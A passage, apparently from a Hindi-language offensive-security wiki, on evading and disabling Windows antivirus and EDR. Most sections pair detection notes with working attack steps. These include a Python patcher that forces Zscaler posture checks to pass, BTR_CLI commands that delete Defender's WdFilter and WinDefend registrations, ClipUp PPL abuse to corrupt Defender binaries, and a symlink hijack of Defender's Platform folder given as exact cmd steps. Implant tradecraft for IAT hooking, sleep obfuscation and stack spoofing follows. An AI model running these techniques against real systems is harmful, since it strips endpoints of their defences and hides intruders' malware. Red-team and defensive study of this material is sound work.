4. **यह क्यों काम करता है**: BYOVD user-mode protections को पूरी तरह दरकिनार कर देता है; kernel में execute होने वाला code, PPL/PP, ELAM या अन्य hardening features की परवाह किए बिना *protected* processes को खोल सकता है, उन्हें terminate कर सकता है या kernel objects के साथ छेड़छाड़ कर सकता है।

पता लगाना / Mitigation  
•  Microsoft की vulnerable-driver block list (`HVCI`, `Smart App Control`) enable करें, ताकि Windows `AToolsKrnl64.sys` को load करने से इनकार करे।  
•  नई *kernel* services के creation पर नज़र रखें और जब कोई driver world-writable directory से load हो या allow-list में मौजूद न हो, तो alert दें।  
•  custom device objects के लिए user-mode handles और उसके बाद होने वाली संदिग्ध `DeviceIoControl` calls पर नज़र रखें।

### On-Disk Binary Patching के ज़रिए Zscaler Client Connector Posture Checks को दरकिनार करना

Zscaler का **Client Connector** device-posture rules को स्थानीय रूप से लागू करता है और परिणामों को अन्य components तक पहुँचाने के लिए Windows RPC पर निर्भर करता है। डिज़ाइन के दो कमज़ोर विकल्प पूर्ण bypass को संभव बनाते हैं:

1. Posture evaluation **पूरी तरह client-side** होती है (server को एक boolean भेजा जाता है)।
2. Internal RPC endpoints केवल यह validate करते हैं कि connecting executable **Zscaler द्वारा signed** है (`WinVerifyTrust` के ज़रिए)।<sup>[[11]](#references)</sup>

**डिस्क पर चार signed binaries को patch करके** दोनों mechanisms को निष्क्रिय किया जा सकता है:

| Binary | मूल logic जिसे patch किया गया | परिणाम |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` लौटाता है, इसलिए हर check compliant होता है |
| `ZSAService.exe` | `WinVerifyTrust` को indirect call | NOP-ed ⇒ कोई भी process (unsigned भी) RPC pipes से bind कर सकता है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` से बदल दिया जाता है |
| `ZSATunnel.exe` | tunnel पर integrity checks | Short-circuited |

न्यूनतम patcher excerpt:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

मूल files को replace करने और service stack restart करने के बाद:

* **सभी** posture checks **green/compliant** दिखाते हैं।
* Unsigned या modified binaries named-pipe RPC endpoints (जैसे `\\RPC Control\\ZSATrayManager_talk_to_me`) खोल सकते हैं।
* Compromised host को Zscaler policies द्वारा परिभाषित internal network तक unrestricted access मिल जाता है।

यह case study दर्शाता है कि केवल client-side trust decisions और साधारण signature checks को कुछ byte patches से कैसे हराया जा सकता है।

## Microsoft Defender `BTR.sys` की विश्वसनीय-कार्यक्षमता का दुरुपयोग

Defender का **Boot-Time Removal** driver, classic BYOVD का एक उपयोगी प्रतिवाद है। `BTR.sys` एक वैध Microsoft-signed remediation component है, जिसमें memory-corruption bug नहीं है और न ही IOCTL interface; administrator access और `SeLoadDriverPrivilege` हासिल करने के बाद, operator इसके private remediation transaction को forge करके इच्छित Ring-0 file/registry operations कर सकता है। यह **post-compromise AV/EDR-neutralization primitive है, initial access या privilege escalation नहीं**, और conspicuous third-party driver import करने के बजाय driver को target के अपने `MpEngine.dll` के `BOOTTIMETOOL` resource से extract किया जा सकता है।<sup>[[36]](#references)</sup>

### One-shot driver की staging

Defender आमतौर पर resource को random `[a-z]{8}.sys` file के रूप में रखता है और उसी तरह नामित kernel service register करता है। `DriverEntry` service की `Args` value पढ़ता है, संदर्भित NTFS ADS खोलता है, action list को decrypt और validate करता है, feedback लिखता है, और सफल execution के बाद `0xC0000056` (`STATUS_DELETE_PENDING`) लौटाता है, ताकि driver resident रहने के बजाय unload हो जाए। Forged service में निम्नलिखित विशिष्ट values होती हैं।<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

The `:changelist` stream में एक RC4-encrypted blob होता है। विश्लेषित builds में एक निश्चित 256-byte key का पुनः उपयोग होता है, इसलिए encryption, authorization boundary नहीं है। एक मान्य plaintext में 24-byte का global header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC और payload से निकला transaction ID) होता है, जिसके बाद null-terminated UTF-16 feedback path और किसी भी संख्या में items होते हैं। हर item में 16-byte का header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) और action-specific data होता है, जिसका अंत **ठीक चार NUL bytes** से होता है। हर header/data region को CRC-32 polynomial `0xEDB88320`, initial state `0xFFFFFFFF`, और **कोई final XOR नहीं** (`~CRC32`) के साथ अलग-अलग जाँचा जाता है; हर region के लिए CRC state reset होता है।<sup>[[36]](#references)[[37]](#references)</sup>

स्वीकृत action IDs इन kernel primitives को उजागर करते हैं।<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item data | परिणाम |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | किसी file को delete करना, locked file सहित |
| 2 | `[UTF-16 path]` | खाली directory हटाना |
| 3 | `[Flags][source][destination]` | file को attacker द्वारा चुने गए protected path पर ले जाना; खाली destination का अर्थ delete करना है |
| 4 | `[Flags][key path]` | registry key को recursively delete करना |
| 5 | `[Flags][key path + "\\" + value]` | registry value को delete करना |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | registry value बनाना/अपडेट करना और अनुपस्थित key paths बनाना |

Actions 5 और 6 के लिए, on-wire key/value separator में **लगातार दो backslashes** होते हैं; सामान्य रूप से format किया गया path सही तरीके से split नहीं होगा। Feedback file ज़्यादातर request की नकल करती है, लेकिन हर item के पहले चार data bytes उसके परिणामी `NTSTATUS` बन जाते हैं। Actions 1 और 2 में, जिनमें leading flags field नहीं होता, BTR path को चार reserved trailing bytes में shift करता है, ताकि उस status के लिए जगह बन सके।<sup>[[36]](#references)</sup>

### `BTR_CLI` workflow और early-boot window

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) पूरी chain लागू करता है: local Defender से `BTR.sys` निकालना, `<random>.sys:changelist` और feedback stream बनाना, chained actions को serialize/checksum/encrypt करना, service registry key सीधे बनाना, फिर `-trigger now` के लिए `NtLoadDriver` call करना या `-trigger boot` के लिए उसे system-start driver के रूप में छोड़ देना। Registry को सीधे stage करने से सामान्य SCM `CreateServiceW` path से बचा जाता है और इसलिए service-install Event ID 7045 **उत्पन्न नहीं होता**। Boot-triggered artifacts को बाद में `BTR_CLI.exe -cleanup <service_name>` से हटाया जा सकता है।<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` उपयोगी नहीं है, क्योंकि storage stack और `SystemRoot` link तैयार होने से पहले BTR, `DriverEntry` से file I/O करता है। `Start=1` और high-priority `Boot Bus Extender` group के साथ यह Phase 1 में चलता है: NTFS उपयोग के लिए तैयार होता है, लेकिन कई system-start security drivers और user-mode EDR services अभी initialize नहीं हुए होते। `WdFilter` जैसे boot-start filters पहले से load हो चुके हो सकते हैं, फिर भी BTR अगले start से पहले उनकी binaries या service configuration हटा सकता है और SCM द्वारा उन्हें launch किए जाने से पहले service executables delete कर सकता है। ELAM इस gap को बंद नहीं करता, क्योंकि BTR boot-start evaluation के बाद चलता है और उसके पास एक valid Microsoft signature होता है।<sup>[[36]](#references)</sup>

एक transaction में कई actions execute होते हैं। PoC, hard-coded `\SystemRoot\Temp\BootClean.log` के लिए Action 1 को सबसे पहले जोड़ता है: BTR यह log बनाता है, फिर अपने delete request को पूरा करके unload होने से पहले इसे हटा देता है। इससे evidence कम होता है, जबकि feedback को `<random>.sys:<random>.dat` में रखने से driver और दोनों streams को एक साथ हटाया जा सकता है।<sup>[[36]](#references)[[37]](#references)</sup>

### High-signal detection correlations

सिर्फ signature पर आधारित rules और Microsoft vulnerable-driver blocklist, BTR की intended functionality के दुरुपयोग को नहीं रोकते। इन behavioral correlations को प्राथमिकता दें और legitimate Defender lineage को किसी arbitrary launcher से अलग पहचानें।<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` का बनना BTR staging में हमेशा होता है। उसी `.sys` से जुड़ा `.dat` ADS विशेष रूप से संदिग्ध है, क्योंकि legitimate Defender आम तौर पर feedback को `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` के नीचे रखता है।
- **Sysmon 12/13 बिना System 7045 के:** `HKLM\SYSTEM\CurrentControlSet\Services\<random>` का direct creation correlate करें, जिसमें `Args=...:changelist` और `Group=Boot Bus Extender` हों, लेकिन उससे मेल खाता SCM installation event न हो।
- **Sysmon 6 -> 23:** किसी non-Defender lineage से ज्ञात BTR driver load को उसके बाद `System`/PID 4 द्वारा की गई file deletion से correlate करें, विशेषकर security binaries के लिए।
- **Sysmon 11 -> 23:** `System`/PID 4 द्वारा `\SystemRoot\Temp\BootClean.log` को तेज़ी से बनाने और delete करने पर alert करें।
- `SeLoadDriverPrivilege` के assignment/enabling को सीमित और audit करें; जब किसी security-tool driver को `cmd.exe`, PowerShell या किसी अज्ञात process द्वारा stage किया जा रहा हो, तो केवल Microsoft signature पर्याप्त भरोसा नहीं देता।

## PPL का दुरुपयोग करके LOLBINs से AV/EDR के साथ छेड़छाड़ करना

Protected Process Light (PPL) signer/level hierarchy लागू करता है, ताकि केवल समान या उच्च स्तर के protected processes ही एक-दूसरे के साथ छेड़छाड़ कर सकें। Offensive दृष्टिकोण से, यदि आप वैध रूप से PPL-enabled binary launch कर सकते हैं और उसके arguments नियंत्रित कर सकते हैं, तो benign functionality (जैसे logging) को AV/EDR द्वारा उपयोग की जाने वाली protected directories के विरुद्ध एक सीमित, PPL-backed write primitive में बदल सकते हैं।<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

PPL के रूप में process चलाने के लिए आवश्यक बातें
- Target EXE (और load की गई कोई भी DLL) को PPL-capable EKU के साथ sign किया होना चाहिए।
- Process को इन flags के साथ CreateProcess का उपयोग करके बनाया जाना चाहिए: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`।
- ऐसा compatible protection level माँगा जाना चाहिए जो binary के signer से मेल खाता हो (जैसे anti-malware signers के लिए `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signers के लिए `PROTECTION_LEVEL_WINDOWS`)। गलत levels पर creation विफल हो जाएगा।

PP/PPL और LSASS protection के व्यापक परिचय के लिए यह भी देखें:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level चुनता है और target EXE को arguments forward करता है):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- उपयोग का तरीका:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- हस्ताक्षरित सिस्टम बाइनरी `C:\Windows\System32\ClipUp.exe` स्वयं को लॉन्च करती है और एक पैरामीटर स्वीकार करती है, जिससे कॉलर द्वारा निर्दिष्ट पथ पर लॉग फ़ाइल लिखी जा सकती है।
- PPL process के रूप में लॉन्च करने पर, फ़ाइल लिखने की प्रक्रिया PPL के backing से होती है।
- ClipUp उन paths को parse नहीं कर सकता जिनमें spaces हों; आम तौर पर सुरक्षित स्थानों तक पहुँचने के लिए 8.3 short paths का उपयोग करें।

8.3 short path helpers
- Short names की सूची बनाएँ: हर parent directory में `dir /x`।
- cmd में short path निकालें: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) किसी launcher (जैसे CreateProcessAsPPL) का उपयोग करके `CREATE_PROTECTED_PROCESS` के साथ PPL-capable LOLBIN (ClipUp) लॉन्च करें।
2) ClipUp का log-path argument दें, ताकि किसी सुरक्षित AV directory (जैसे Defender Platform) में फ़ाइल बनाई जा सके। ज़रूरत पड़ने पर 8.3 short names का उपयोग करें।
3) यदि AV के चलते target binary सामान्यतः खुली/locked रहती है (जैसे MsMpEng.exe), तो boot पर AV शुरू होने से पहले write शेड्यूल करें—ऐसी auto-start service install करके जो भरोसेमंद ढंग से पहले चलती हो। Process Monitor (boot logging) से boot ordering की पुष्टि करें।
4) Reboot पर PPL-backed write, AV द्वारा उसकी binaries को lock करने से पहले होती है, जिससे target file corrupt हो जाती है और startup रुक जाता है।

Example invocation (paths redacted/shortened for safety):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notes और सीमाएँ
- आप ClipUp द्वारा लिखी जाने वाली सामग्री को नियंत्रित नहीं कर सकते; केवल उसकी placement नियंत्रित कर सकते हैं। इसलिए यह primitive सटीक content injection के बजाय corruption के लिए उपयुक्त है।
- Service install/start करने और reboot window के लिए local admin/SYSTEM आवश्यक है।
- Timing महत्वपूर्ण है: target खुला नहीं होना चाहिए; boot-time execution से file locks से बचा जा सकता है।

Detections
- Boot के आसपास असामान्य arguments के साथ `ClipUp.exe` का process creation, खासकर जब उसका parent non-standard launcher हो।
- ऐसे नए services जो संदिग्ध binaries को auto-start के लिए configure हों और लगातार Defender/AV से पहले शुरू हों। Defender startup failures से पहले service creation/modification की जाँच करें।
- Defender binaries/Platform directories पर file integrity monitoring; protected-process flags वाले processes द्वारा अप्रत्याशित file creation/modification।
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` के साथ बनाए गए processes और non-AV binaries द्वारा असामान्य PPL level के उपयोग पर नज़र रखें।

Mitigations
- WDAC/Code Integrity: सीमित करें कि कौन-सी signed binaries PPL के रूप में और किन parents के तहत चल सकती हैं; वैध contexts के बाहर ClipUp invocation को block करें।
- Service hygiene: auto-start services के creation/modification को सीमित करें और start-order में बदलाव की निगरानी करें।
- सुनिश्चित करें कि Defender tamper protection और early-launch protections enabled हों; binary corruption के संकेत देने वाली startup errors की जाँच करें।
- यदि आपके environment के अनुकूल हो, तो security tooling वाली volumes पर 8.3 short-name generation को disabled करने पर विचार करें (अच्छी तरह test करें)।

## Platform Version Folder Symlink Hijack के ज़रिए Microsoft Defender में छेड़छाड़

Windows Defender यह तय करता है कि वह किस platform से चलेगा, इसके लिए वह इस directory के अंतर्गत subfolders की सूची बनाता है:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

यह सबसे ऊँची lexicographic version string वाला subfolder चुनता है (उदाहरण के लिए, `4.18.25070.5-0`), फिर वहीं से Defender service processes शुरू करता है (और service/registry paths को उसी के अनुसार update करता है)। यह चयन directory entries पर भरोसा करता है, जिनमें directory reparse points (symlinks) भी शामिल हैं। एक administrator इसका इस्तेमाल Defender को attacker-writable path पर redirect करने और DLL sideloading या service disruption करने के लिए कर सकता है।<sup>[[21]](#references)[[22]](#references)</sup>

पूर्वापेक्षाएँ
- Local Administrator (Platform folder के अंतर्गत directories/symlinks बनाने के लिए आवश्यक)
- Reboot करने या Defender platform को फिर से चुनने के लिए trigger करने की क्षमता (boot पर service restart)
- केवल built-in tools की आवश्यकता (mklink)

यह क्यों काम करता है
- Defender अपने folders में writes को block करता है, लेकिन इसका platform selection directory entries पर भरोसा करता है और यह validate किए बिना कि target किसी protected/trusted path पर resolve होता है या नहीं, सबसे ऊँचा lexicographic version चुनता है।

चरण-दर-चरण (उदाहरण)
1) मौजूदा platform folder की एक writable clone तैयार करें, जैसे `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform के अंदर अपने फ़ोल्डर की ओर इंगित करने वाला higher-version directory symlink बनाएँ:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) ट्रिगर चयन (रीबूट की अनुशंसा):
```cmd
shutdown /r /t 0
```
4) पुष्टि करें कि MsMpEng.exe (WinDefend) रीडायरेक्ट किए गए path से चलता है:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
आपको `C:\TMP\AV\` के अंतर्गत नया process path और उस location को दर्शाने वाली service configuration/registry दिखाई देनी चाहिए।

Post-exploitation विकल्प
- DLL sideloading/code execution: Defender के application directory से load होने वाली DLLs को drop/replace करके Defender के processes में code execute करें। ऊपर दिया गया section देखें: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink हटाएँ, ताकि अगली बार start होने पर configured path resolve न हो और Defender start होने में विफल रहे:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> ध्यान दें कि यह तकनीक अपने आप privilege escalation नहीं करती; इसके लिए admin rights चाहिए।

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams runtime evasion को C2 implant से हटाकर सीधे target module में ले जा सकती हैं। इसके लिए उसके Import Address Table (IAT) को hook करके चुने हुए APIs को attacker-controlled, position-independent code (PIC) के ज़रिए route किया जाता है। इससे evasion उन छोटे API surface से आगे तक लागू होता है जिन्हें कई kits expose करती हैं (जैसे, CreateProcessA), और यही protections BOFs तथा post-exploitation DLLs तक भी पहुँचती हैं।<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

उच्च-स्तरीय तरीका
- Reflective loader (prepend किया हुआ या companion) का उपयोग करके target module के साथ PIC blob stage करें। PIC self-contained और position-independent होना चाहिए।
- Host DLL लोड होते समय, उसके IMAGE_IMPORT_DESCRIPTOR को देखें और targeted imports (जैसे, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) के IAT entries को पतले PIC wrappers की ओर point करने के लिए patch करें।
- हर PIC wrapper, असली API address को tail-call करने से पहले evasions चलाता है। आम evasions में शामिल हैं:
  - Call के आसपास memory को mask/unmask करना (जैसे, beacon regions को encrypt करना, RWX→RX करना, page names/permissions बदलना), फिर call के बाद उन्हें restore करना।
  - Call-stack spoofing: एक benign stack बनाना और target API में transition करना, ताकि call-stack analysis में अपेक्षित frames दिखाई दें।<sup>[[9]](#references)</sup>
- Compatibility के लिए एक interface export करें, ताकि Aggressor script (या equivalent) यह register कर सके कि Beacon, BOFs और post-ex DLLs के लिए किन APIs को hook करना है।

यहाँ IAT hooking क्यों
- Hook किए गए import का उपयोग करने वाले किसी भी code के लिए काम करता है। इसके लिए tool code में बदलाव करने या specific APIs को proxy करने के लिए Beacon पर निर्भर रहने की ज़रूरत नहीं होती।
- Post-ex DLLs को cover करता है: LoadLibrary* को hook करने से module loads (जैसे, System.Management.Automation.dll, clr.dll) को intercept किया जा सकता है और उनकी API calls पर वही masking/stack evasion लागू की जा सकती है।
- CreateProcessA/W को wrap करके, call-stack–based detections के बावजूद process-spawning post-ex commands का भरोसेमंद इस्तेमाल संभव बनाता है।

न्यूनतम IAT hook का खाका (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- relocations/ASLR के बाद और import के पहले उपयोग से पहले patch लागू करें। TitanLdr/AceLdr जैसे Reflective loaders, लोड किए गए module के DllMain के दौरान hooking करने के उदाहरण हैं।
- Wrappers छोटे और PIC-safe रखें; patching से पहले कैप्चर की गई original IAT value या LdrGetProcedureAddress के ज़रिए असली API resolve करें।
- PIC के लिए RW → RX transitions का उपयोग करें और writable+executable pages को खुला न छोड़ें।

Call‑stack spoofing stub
- Draugr‑style PIC stubs एक नकली call chain बनाते हैं (benign modules के return addresses के साथ) और फिर असली API में pivot करते हैं।
- इससे वे detections निष्प्रभावी होते हैं जो मानते हैं कि Beacon/BOFs से sensitive APIs तक canonical stacks होंगे।
- API prologue से पहले अपेक्षित frames के अंदर पहुँचने के लिए इसे stack cutting/stack stitching techniques के साथ इस्तेमाल करें।

Operational integration
- Reflective loader को post-ex DLLs के आगे जोड़ें, ताकि DLL लोड होने पर PIC और hooks अपने-आप initialize हो जाएँ।
- Target APIs register करने के लिए Aggressor script का उपयोग करें, ताकि Beacon और BOFs को बिना code changes के उसी evasion path का लाभ मिले।

Detection/DFIR considerations
- IAT integrity: ऐसी entries जो non-image (heap/anon) addresses पर resolve होती हैं; import pointers का समय-समय पर सत्यापन।
- Stack anomalies: ऐसे return addresses जो loaded images से संबंधित न हों; non-image PIC पर अचानक transitions; असंगत RtlUserThreadStart ancestry।
- Loader telemetry: IAT में in-process writes, import thunks को बदलने वाली शुरुआती DllMain activity, load के समय बने अप्रत्याशित RX regions।
- Image-load evasion: अगर LoadLibrary* को hook किया गया है, तो memory masking events के साथ सहसंबंधित automation/clr assemblies के संदिग्ध loads पर नज़र रखें।

Related building blocks and examples
- ऐसे Reflective loaders जो load के दौरान IAT patching करते हैं (जैसे, TitanLdr, AceLdr)
- Memory masking hooks (जैसे, simplehook) और stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (जैसे, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### resident PICO के ज़रिए import-time IAT hooks

अगर आपके नियंत्रण में Reflective loader है, तो आप `ProcessImports()` के **दौरान** loader के `GetProcAddress` pointer को एक custom resolver से बदलकर imports को hook कर सकते हैं, जो पहले hooks जाँचता है:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- एक **resident PICO** (persistent PIC object) बनाएँ, जो transient loader PIC के खुद को free करने के बाद भी बना रहे।
- एक `setup_hooks()` function export करें, जो loader के import resolver को overwrite करे (जैसे, `funcs.GetProcAddress = _GetProcAddress`)।
- `_GetProcAddress` में ordinal imports को छोड़ें और `__resolve_hook(ror13hash(name))` जैसा hash-based hook lookup इस्तेमाल करें। Hook मौजूद हो, तो उसे लौटाएँ; अन्यथा असली `GetProcAddress` को call करें।
- Crystal Palace के `addhook "MODULE$Func" "hook"` entries के ज़रिए link time पर hook targets register करें। Hook मान्य रहता है क्योंकि यह resident PICO के अंदर मौजूद होता है।

इससे load के बाद loaded DLL के code section को patch किए बिना **import-time IAT redirection** होता है।

### जब target PEB-walking का इस्तेमाल करे, तब hookable imports को बाध्य करना

Import-time hooks तभी trigger होते हैं जब function वास्तव में target के IAT में हो। अगर कोई module PEB-walk + hash से APIs resolve करता है (और import entry नहीं होती), तो एक वास्तविक import जोड़ें, ताकि loader का `ProcessImports()` path उसे देख सके:

- Hashed export resolution (जैसे, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) को `&WaitForSingleObject` जैसे direct reference से बदलें।
- Compiler एक IAT entry बनाएगा, जिससे Reflective loader द्वारा imports resolve किए जाने पर interception संभव होगा।

### `Sleep()` को patch किए बिना Ekko-style sleep/idle obfuscation

`Sleep` को patch करने के बजाय, implant जिन **वास्तविक wait/IPC primitives** का उपयोग करता है उन्हें hook करें (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`)। लंबे waits के लिए, call को Ekko-style obfuscation chain में wrap करें, जो idle के दौरान in-memory image को encrypt करती है:<sup>[[31]](#references)[[27]](#references)</sup>

- Callbacks की एक sequence schedule करने के लिए `CreateTimerQueueTimer` का उपयोग करें, जो crafted `CONTEXT` frames के साथ `NtContinue` call करती है।
- सामान्य chain (x64): image को `PAGE_READWRITE` पर सेट करें → पूरी mapped image पर `advapi32!SystemFunction032` के ज़रिए RC4 encrypt करें → blocking wait करें → RC4 decrypt करें → PE sections पर चलकर **प्रति-section permissions restore** करें → completion signal करें।
- `RtlCaptureContext` एक template `CONTEXT` देता है; इसे कई frames में clone करें और हर step invoke करने के लिए registers (`Rip/Rcx/Rdx/R8/R9`) सेट करें।

Operational detail: लंबे waits (जैसे, `WAIT_OBJECT_0`) के लिए “success” लौटाएँ, ताकि image masked रहते हुए caller आगे बढ़े। यह तरीका idle windows के दौरान module को scanners से छिपाता है और पारंपरिक “patched `Sleep()`” signature से बचता है।

Detection ideas (telemetry-based)
- `CreateTimerQueueTimer` callbacks के ऐसे bursts, जो `NtContinue` की ओर point करते हों।
- बड़े contiguous, image-sized buffers पर `advapi32!SystemFunction032` का उपयोग।
- बड़े range पर `VirtualProtect` के बाद custom per-section permission restoration।

### sleep-obfuscation gadgets के लिए Runtime CFG registration

CFG-enabled targets पर, `jmp [rbx]` या `jmp rdi` जैसे mid-function gadget में पहली indirect jump आम तौर पर `STATUS_STACK_BUFFER_OVERRUN` के साथ process crash कर देगी, क्योंकि gadget module के CFG metadata में मौजूद नहीं होता। Hardened processes के अंदर Ekko/Kraken-style chains को चालू रखने के लिए:<sup>[[30]](#references)</sup>

- Chain में इस्तेमाल होने वाले हर indirect destination को `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` और `CFG_CALL_TARGET_VALID` entries के साथ register करें।
- Loaded images (`ntdll`, `kernel32`, `advapi32`) के अंदर मौजूद addresses के लिए, `MEMORY_RANGE_ENTRY` को **image base** से शुरू होना चाहिए और **पूरे image size** को cover करना चाहिए।
- Manually mapped/PIC/stomped regions के लिए, इसके बजाय **allocation base** और allocation size का उपयोग करें।
- केवल dispatch gadget ही नहीं, बल्कि उन exports को भी mark करें जिन तक indirectly पहुँचा जाता है (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), और attacker-controlled executable sections को भी mark करें जो indirect targets बनेंगे।

इससे ROP/JOP-style sleep chains “केवल non-CFG processes में काम करता है” से बदलकर `explorer.exe`, browsers, `svchost.exe` और `/guard:cf` के साथ compiled अन्य endpoints के लिए reusable primitive बन जाती हैं।

### सोती हुई threads के लिए CET-safe stack spoofing

Full `CONTEXT` replacement noisy होता है और CET Shadow Stack systems पर विफल हो सकता है, क्योंकि spoofed `Rip` का hardware shadow stack से मेल खाना ज़रूरी है। Sleep-masking का एक सुरक्षित तरीका यह है:<sup>[[30]](#references)</sup>

- उसी process में कोई दूसरी thread चुनें और `NtQueryInformationThread` के ज़रिए उसकी `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) पढ़ें।
- मौजूदा thread के असली TEB/TIB का backup लें।
- `GetThreadContext` से असली sleeping context capture करें।
- Spoof context में केवल असली `Rip` copy करें; spoofed `Rsp`/stack state को जस का तस रखें।
- Sleep window के दौरान, spoof thread का `NT_TIB` मौजूदा TEB में copy करें, ताकि stack walkers एक वैध stack range के अंदर unwind करें।
- Wait पूरा होने के बाद, original TIB और thread context restore करें।

इससे CET-संगत instruction pointer बना रहता है, जबकि उन EDR stack walkers को गुमराह किया जाता है जो unwinds validate करने के लिए TEB stack metadata पर भरोसा करते हैं।

### APC-based विकल्प: Kraken Mask

अगर timer-queue dispatch पर आसानी से signature बनता है, तो वही sleep-encrypt-spoof-restore sequence queued APCs का उपयोग करके suspended helper thread से execute की जा सकती है:<sup>[[27]](#references)</sup>

- Entry point के रूप में `NtTestAlert` वाली helper thread बनाएँ।
- `NtQueueApcThread` से तैयार `CONTEXT` frames/APCs queue करें और `NtAlertResumeThread` से उन्हें drain करें।
- Default 64 KB thread stack को exhaust होने से बचाने के लिए chain state को helper stack के बजाय heap पर रखें।
- Start event को atomically signal करने और block होने के लिए `NtSignalAndWaitForSingleObject` का उपयोग करें।
- TIB/context restore करने से पहले main thread को suspend करें (`NtSuspendThread` → restore → `NtResumeThread`), ताकि scanner द्वारा आधी-restored stack पकड़े जाने की race window कम हो।

इससे वही RC4 masking और stack-spoofing लक्ष्य रखते हुए `CreateTimerQueueTimer` + `NtContinue` signature की जगह helper-thread/APC signature इस्तेमाल होती है।

Additional detection ideas
- Sleeps, waits या APC dispatch से ठीक पहले `NtSetInformationVirtualMemory` के साथ `VmCfgCallTargetInformation` का उपयोग।
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` या `ConnectNamedPipe` के आसपास `GetThreadContext`/`SetThreadContext` का उपयोग।
- `NtQueryInformationThread` के बाद मौजूदा thread के TEB/TIB stack bounds में सीधे writes।
- `NtQueueApcThread`/`NtAlertResumeThread` chains, जो indirectly `SystemFunction032`, `VirtualProtect` या section-permission restoration helpers तक पहुँचती हैं।
- Signed modules के अंदर dispatch pivots के रूप में `FF 23` (`jmp [rbx]`) या `FF E7` (`jmp rdi`) जैसी छोटी gadget signatures का बार-बार उपयोग।


## Precision Module Stomping

Module stomping, स्पष्ट private executable memory allocate करने या नई sacrificial DLL load करने के बजाय, payloads को **target process के अंदर पहले से mapped DLL के `.text` section से** execute करता है। Overwrite target एक **loaded, disk-backed image** होना चाहिए, जिसका code space payload को इस तरह समा सके कि process को अभी भी ज़रूरी code paths corrupt न हों।<sup>[[1]](#references)[[2]](#references)</sup>

### भरोसेमंद target चुनना
